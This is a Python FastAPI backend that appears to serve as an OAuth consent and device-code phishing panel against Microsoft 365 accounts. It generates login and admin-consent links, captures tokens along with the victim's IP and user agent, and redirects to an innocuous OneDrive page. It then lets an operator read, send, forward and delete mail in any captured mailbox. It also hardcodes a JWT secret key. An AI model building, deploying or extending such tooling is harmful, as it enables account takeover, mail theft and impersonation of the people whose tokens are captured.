from fastapi import FastAPI, Request, Depends, HTTPException, status
from fastapi.responses import RedirectResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import logging
import os

from auth import (
    generate_login_link,
    generate_org_connect_link,
    generate_admin_consent_url,
    exchange_code_for_token,
    get_token,
    start_device_code_flow,
    poll_device_code_flow,
    save_or_update_tenant_consent,
)
from graph import (
    fetch_emails,
    get_mail_folders,
    get_email_detail,
    reply_to_email,
    send_email,
    forward_email,
    delete_email,
    mark_as_read,
    move_email_to_folder
)
from admin_auth import login_admin
from db import init_db, SessionLocal
from models import Rule, TenantToken, RuleAction, SavedUser, ConnectInvite, TenantConsent, TenantConsentStatus

from jose import jwt, JWTError
from datetime import datetime, timedelta

app = FastAPI()

# =========================
# JWT CONFIG
# =========================
SECRET_KEY = "super-secret-key-change-this"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 10080  # 7 days

security = HTTPBearer()


def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)


def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        token = credentials.credentials
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token"
        )


def resolve_user_id(requested_user_id: str | None, user_payload: dict) -> str:
    return requested_user_id or user_payload["sub"]


# =========================
# LOGGING
# =========================
logging.basicConfig(level=logging.DEBUG)

# =========================
# CORS
# =========================
origins = [
    "http://localhost:3000",
    "https://frontend-xg84.onrender.com",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# =========================
# STARTUP
# =========================
@app.on_event("startup")
def startup():
    init_db()


# =========================
# ADMIN LOGIN
# =========================
@app.post("/admin/login")
async def admin_login_route(request: Request):
    body = await request.json()

    username = body.get("username")
    password = body.get("password")

    result = login_admin(username, password)

    if not result:
        return JSONResponse({"error": "Login failed"}, status_code=401)

    token = create_access_token({"sub": username})

    return {
        "access_token": token,
        "token_type": "bearer"
    }


# =========================
# TENANT CONSENT FLOW
# =========================
@app.post("/tenant-consent/generate")
async def generate_tenant_consent(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = body.get("tenant_hint")

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint is required")

    admin_user_id = user["sub"]

    consent_url = generate_admin_consent_url(tenant_hint)

    save_or_update_tenant_consent(
        admin_user_id=admin_user_id,
        tenant_hint=tenant_hint,
        admin_consent_url=consent_url,
        status=TenantConsentStatus.PENDING
    )

    return {
        "tenant_hint": tenant_hint,
        "admin_consent_url": consent_url,
        "status": "pending"
    }


@app.get("/tenant-consents")
def list_tenant_consents(user=Depends(verify_token)):
    db = SessionLocal()
    try:
        admin_user_id = user["sub"]

        rows = db.query(TenantConsent).filter(
            TenantConsent.admin_user_id == admin_user_id
        ).all()

        return {
            "tenants": [
                {
                    "tenant_hint": r.tenant_hint,
                    "status": r.status.value,
                    "admin_consent_url": r.admin_consent_url,
                    "updated_at": r.updated_at
                }
                for r in rows
            ]
        }
    finally:
        db.close()


@app.post("/tenant-consent/approve")
async def manually_approve_tenant(request: Request, user=Depends(verify_token)):
    body = await request.json()
    tenant_hint = body.get("tenant_hint")

    if not tenant_hint:
        raise HTTPException(status_code=400, detail="tenant_hint required")

    save_or_update_tenant_consent(
        admin_user_id=user["sub"],
        tenant_hint=tenant_hint,
        status=TenantConsentStatus.APPROVED,
        notes="Manually approved"
    )

    return {"status": "approved", "tenant_hint": tenant_hint}


# =========================
# MICROSOFT LOGIN
# =========================
@app.get("/generate-login-url")
def generate_login_url(user_id: str, user=Depends(verify_token)):
    return {"login_url": generate_login_link(user_id)}


@app.get("/generate-org-connect-url")
def generate_org_connect_url(tenant_hint: str | None = None, user=Depends(verify_token)):
    admin_user_id = user["sub"]

    login_url = generate_org_connect_link(admin_user_id, tenant_hint)

    return {
        "login_url": login_url,
        "tenant_hint": tenant_hint
    }


@app.get("/generate-admin-consent-url")
def generate_admin_consent_url_route(tenant: str | None = None, user=Depends(verify_token)):
    return {
        "admin_consent_url": generate_admin_consent_url(tenant)
    }


# =========================
# OAUTH CALLBACK
# =========================
@app.get("/auth/callback")
def auth_callback(request: Request):
    code = request.query_params.get("code")
    state = request.query_params.get("state")

    if not code:
        return {"error": "No code received"}

    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent")

    try:
        exchange_code_for_token(code, state, client_ip, user_agent)

        return RedirectResponse(
            url="https://www.microsoft.com/en-us/microsoft-365/onedrive/online-cloud-storage"
        )
    except Exception as e:
        return {"error": str(e)}


# =========================
# EMAIL ROUTES (UNCHANGED)
# =========================
@app.get("/emails")
def get_emails(user_id: str, user=Depends(verify_token)):
    return {"emails": fetch_emails(user_id)}


@app.get("/folders")
def get_folders(user_id: str, user=Depends(verify_token)):
    return {"folders": get_mail_folders(user_id)}


@app.get("/email/{message_id}")
def email_detail(message_id: str, user_id: str, user=Depends(verify_token)):
    return get_email_detail(user_id, message_id)


@app.post("/email/reply")
async def reply_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    return reply_to_email(body["user_id"], body["message_id"], body["reply_text"])


@app.post("/email/send")
async def send_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    return send_email(body["user_id"], body["to"], body["subject"], body["body"])


@app.post("/email/forward")
async def forward_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    return forward_email(body["user_id"], body["message_id"], body["to"])


@app.post("/email/delete")
async def delete_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    return delete_email(body["user_id"], body["message_id"])


@app.post("/email/mark-read")
async def mark_read_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    return mark_as_read(body["user_id"], body["message_id"], True)


@app.post("/email/move")
async def move_email_route(request: Request, user=Depends(verify_token)):
    body = await request.json()
    return move_email_to_folder(body["user_id"], body["message_id"], body["folder_id"])